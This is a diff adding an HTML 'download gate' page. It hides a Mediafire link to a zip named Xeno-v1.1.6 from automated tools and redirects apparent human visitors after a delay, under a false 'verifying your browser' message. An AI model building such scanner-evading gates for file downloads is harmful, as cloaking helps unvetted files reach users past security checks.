@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Gate</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Anti-bot and delay system
+        function isHuman() {
+            return navigator.webdriver === false && window.outerWidth > 100 && window.outerHeight > 100;
+        }
+
+        function redirectToMediafire() {
+            if (isHuman()) {
+                setTimeout(function() {
+                    window.location.href = "https://www.mediafire.com/file/ihycjjykf4i5r4o/Xeno-v1.1.6.zip/file";
+                }, 7000); // 7 second delay for anti-bypass
+            } else {
+                document.body.innerHTML = "<h1>Access Denied</h1><p>This page is not accessible via automated tools.</p>";
+            }
+        }
+
+        window.onload = redirectToMediafire;
+    </script>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #121212;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1>Preparing Your Download...</h1>
+    <p>Please wait while we verify your browser.</p>
+</body>
+</html>
